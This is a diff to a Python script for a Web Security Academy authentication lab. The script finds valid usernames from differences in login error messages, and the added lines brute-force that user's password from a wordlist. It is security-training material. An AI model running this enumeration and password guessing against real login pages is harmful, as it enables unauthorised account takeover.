@@ -6,7 +6,7 @@ from bs4 import BeautifulSoup
 
 s = requests.session()
 
-site = "ac311fe21f55517b800c5b99009a0026.web-security-academy.net"
+site = "acec1f2a1fd1436b80d287e900ec0061.web-security-academy.net"
 login_url = f'''https://{site}/login'''
 
 username_list = open("Authentication-lab-usernames.txt", "r").readlines()
@@ -21,6 +21,20 @@ for user in username_list:
 
     resp = s.post(login_url, data=login_data)
     soup = BeautifulSoup(resp.text, 'html.parser')
-    if 'username' not in soup.find('p', {'class': 'is-warning'}).text:
-        print(f'Username is: {target}')
-        break
+    if 'username' not in soup.find('p', {'class':'is-warning'}).text:
+        print(f'Username is: {target}\n')
+
+        # Now to get the password
+        try:
+            for password in password_list:
+                target_password = password.strip()
+                login_data = {
+                    'username': target,
+                    'password': target_password
+                }
+                resp = s.post(login_url, data=login_data)
+                soup = BeautifulSoup(resp.text, 'html.parser')
+                if 'Incorrect password' not in soup.find('p', {'class': 'is-warning'}).text:
+                    print(f'Password is: {target_password}')
+        except:
+            print(f'Password is: {target_password}')
